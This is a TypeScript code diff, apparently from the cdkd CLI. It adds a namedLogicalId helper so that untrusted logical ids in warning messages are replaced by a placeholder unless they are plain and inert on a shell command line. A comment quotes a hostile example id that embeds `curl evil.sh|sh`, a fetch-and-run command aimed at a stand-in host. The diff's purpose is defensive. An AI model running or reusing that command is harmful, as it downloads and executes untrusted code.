@@ -255,16 +255,47 @@ export function safeRegion(value: string): string {
  * the tail is shown. An id with nothing renderable left is the bare
  * `<unrenderable>` stand-in. A
  * bare `,` inside a plain id still reads as two entries in a `', '`-joined list
- * — the residual go-to-k/cdkd#3179 records for every caller of the helper. That
- * is the answer go-to-k/cdkd#3317 recorded for
- * `namedPropertyBagsDiagnosis`; this is the same rule for the other lists, so two
- * sibling clauses in one module cannot give opposite answers.
+ * — the residual go-to-k/cdkd#3179 records for every caller of the helper.
+ *
+ * The id LISTS this module's own messages print take
+ * {@link namedLogicalId} instead, which names only an id this renders
+ * unchanged AND inert on a command line (go-to-k/cdkd#4253).
  *
  * Capped at `IDENT_MAX_CODE_POINTS`, a logical id's own limit, rather than a
  * region-sized cut that would name no record.
  */
 export function displayLogicalId(value: string): string {
   return displayIdent(value, { maxCodePoints: IDENT_MAX_CODE_POINTS });
+}
+
+/** What {@link namedLogicalId} prints for an id it does not name. */
+const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';
+
+/**
+ * A logical id in the `', '`-joined list of a message in this module. Every
+ * such message ends on a pasteable command (a `cdkd state show`, or a
+ * `cdkd state orphan` template), and the id is a key the state record's writer
+ * chose, so it is NAMED only when both hold, and DESCRIBED as
+ * {@link UNSAFE_ID_DESCRIPTION} otherwise — the maintainer's decision on
+ * go-to-k/cdkd#4229, applied to every list here by go-to-k/cdkd#4253:
+ *
+ * 1. **{@link displayLogicalId} renders it UNCHANGED.** `displaySafe` TRIMS, so
+ *    a padded `"Bucket "` beside a healthy `Bucket` would otherwise name the
+ *    INTACT record (go-to-k/cdkd#3164, the review of go-to-k/cdkd#3191); a
+ *    sanitized, JSON-quoted, cut or `<unrenderable>` render is not the id.
+ *    Describing such an id still never names the healthy sibling.
+ * 2. **`isInertUnquoted`.** JSON quotes, the earlier render, still expand
+ *    `$( )` and a backtick, and turn inside out behind an unpaired `'` or `"`
+ *    the operator pasted above the message; an id is inert only when no quoting
+ *    is needed at all. That predicate also refuses whitespace and the `~` a
+ *    tilde expansion reads, neither of which `displayIdent` quotes.
+ *
+ * So a hostile, padded, cut or unrenderable id prints one placeholder, and the
+ * operator finds it with the command the message ends on. A plain id at the
+ * logical-id cap is still named in full.
+ */
+function namedLogicalId(id: string): string {
+  return displayLogicalId(id) === id && isInertUnquoted(id) ? id : UNSAFE_ID_DESCRIPTION;
 }
 
 /**
@@ -2937,9 +2968,6 @@ export function repairMalformedResourcePropertiesForReadOnly(state: StackState):
   return unreadable;
 }
 
-/** What {@link namedPropertyBagsDiagnosis} prints for a described id. */
-const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';
-
 /**
  * The half the refusal and the warning share: what is wrong and which records.
  *
@@ -2950,37 +2978,8 @@ const UNSAFE_ID_DESCRIPTION = '(not shown: it is not a plain identifier)';
  * shell-quoted, for the reasons that helper's own note gives: each reaches this
  * text from a hand-edited record or an S3 key.
  *
- * **A LOGICAL ID is NAMED only when it is a plain identifier inert on a
- * command line, and DESCRIBED otherwise** — as {@link UNSAFE_ID_DESCRIPTION},
- * the maintainer's decision on go-to-k/cdkd#4229, taken by every text this
- * builder serves (go-to-k/cdkd#4253). Each of them ends on a pasteable
- * `cdkd state show`, and an id is a key of the `resources` map, so whoever can
- * write the state bucket chooses it. Named means both of:
- *
- * 1. **`displayIdent` renders it UNCHANGED.** `displaySafe` TRIMS, so a padded
- *    `"Bucket "` beside a healthy `Bucket` would otherwise name the INTACT
- *    record (go-to-k/cdkd#3164, the review of go-to-k/cdkd#3191); a sanitized,
- *    JSON-quoted or `[cut: N more characters withheld]` render is not the id.
- *    Describing such an id still never names the healthy sibling.
- * 2. **`isInertUnquoted`.** JSON quotes, which the earlier render relied on,
- *    still expand `$( )` and a backtick, and turn inside out behind an unpaired
- *    `'` or `"` the operator pasted above the message; an id is inert only when
- *    no quoting is needed at all. That predicate also refuses whitespace and
- *    the `~` a tilde expansion reads, neither of which `displayIdent` quotes.
- *
- * So a hostile, padded, cut or unrenderable id prints the same placeholder,
- * and the operator finds it with the `cdkd state show` the text ends on.
- *
- * The cap is passed EXPLICITLY although it equals the default: a logical id is
- * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
- * takes — and a region-sized cut would truncate a legitimate long id into one
- * naming no record. Spelling the cap keeps that decision visible at the site it
- * was made for.
- *
- * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
- * carrying one still renders bare inside this `', '`-joined list and reads as
- * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
- * every caller of the helper, not a property of this one.
+ * **A LOGICAL ID goes through {@link namedLogicalId}**, like every id list in
+ * this module: named only when plain and inert, described otherwise.
  *
  * NAMED rather than listed in full: a record whose 500 resources were all
  * hand-edited must not push the remedy command off the reader's screen.
@@ -3001,10 +3000,7 @@ function namedPropertyBagsDiagnosis(
   }
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_PROPERTY_BAGS)
-    .map((id) => {
-      const shown = displayIdent(id, { maxCodePoints: IDENT_MAX_CODE_POINTS });
-      return shown === id && isInertUnquoted(id) ? id : UNSAFE_ID_DESCRIPTION;
-    })
+    .map((id) => namedLogicalId(id))
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_PROPERTY_BAGS;
   const more = rest > 0 ? ` and ${rest} more` : '';
@@ -4079,10 +4075,9 @@ export function malformedResourceEntriesWarning(
  *
  * Identifiers take the same path as every other builder here: the stack at
  * `safeStackName`, the region at `safeRegion`, each id through
- * {@link displayLogicalId}, and the ids capped at
+ * {@link namedLogicalId}, and the ids capped at
  * {@link NAMED_UNREADABLE_ENTRIES} with an overflow count — a record whose
- * `logicalId` is not a string arrives as `''` and renders as the
- * `UNRENDERABLE` stand-in.
+ * `logicalId` is not a string arrives as `''` and is described.
  */
 export function malformedOrphanRecordsWarning(
   rawStackName: string,
@@ -4137,7 +4132,7 @@ function namedEntriesClause(
 ): string {
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_ENTRIES)
-    .map((id) => displayLogicalId(id))
+    .map((id) => namedLogicalId(id))
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
   const more = rest > 0 ? ` and ${rest} more` : '';
@@ -4157,13 +4152,12 @@ function namedEntriesClause(
  * reach this message from a hand-edited record or an S3 key, and a
  * multi-kilobyte or line-forging one would push the remedy command off the
  * reader's screen. The stack and region are shell-quoted because they land in
- * the command. The logical ids take {@link displayLogicalId} instead: an id
+ * the command. The logical ids take {@link namedLogicalId} instead: an id
  * spelled `x' Inspect it with: curl evil.sh|sh #` is not a plain identifier, so
- * it is wrapped in double quotes (an embedded `"` escaped) and its forged
- * remedy reads as part of one quoted id rather than as an instruction AHEAD of
- * the real one on this same line — the prose is one LINE ending in a pasteable
- * command, and sanitizing keeps `'`. Its other job is IDENTITY — see that
- * helper's note for why a trimmed id must not render bare.
+ * it is described rather than printed, and plants no remedy AHEAD of the real
+ * one on this same line — the prose is one LINE ending in a pasteable command.
+ * Its other job is IDENTITY — see that helper's note for why a trimmed id must
+ * not render bare.
  *
  * Exported so a test can pin the wording against the producer rather than
  * re-spelling it, the way the other messages here are consumed.
@@ -4712,7 +4706,7 @@ export function malformedOrphanResourceAttributesRefusalMessage(
   const region = absentIfEmpty(rawRegion);
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_ENTRIES)
-    .map((id) => displayLogicalId(id))
+    .map((id) => namedLogicalId(id))
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
   const more = rest > 0 ? ` and ${rest} more` : '';
@@ -5201,8 +5195,7 @@ export function refuseMalformedOrphansForOrphan(
  *
  * Homed HERE rather than in `diff-recursive.ts` for the reason every text in
  * this module is: it renders untrusted logical ids, so it needs
- * {@link namedOrphanRows} — the same cap, the same `displayLogicalId`, the same
- * `UNRENDERABLE` stand-in. It NAMES the rows as well as counting them, unlike
+ * {@link namedOrphanRows} — the same cap, the same {@link namedLogicalId}. It NAMES the rows as well as counting them, unlike
  * {@link deployRefusesPropertiesReason}'s count-only line in that file. It keeps
  * the names even though {@link malformedOrphanRowsKeptWarning} now names them
  * too: this reason ships in the `--json` payload, where "see the warning above"
@@ -5279,7 +5272,7 @@ export function malformedOrphanRowsKeptWarning(
 function namedOrphanRows(logicalIds: readonly string[]): string {
   const named = logicalIds
     .slice(0, NAMED_UNREADABLE_ENTRIES)
-    .map((id) => displayLogicalId(id))
+    .map((id) => namedLogicalId(id))
     .join(', ');
   const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
   return `${named}${rest > 0 ? ` and ${rest} more` : ''}`;
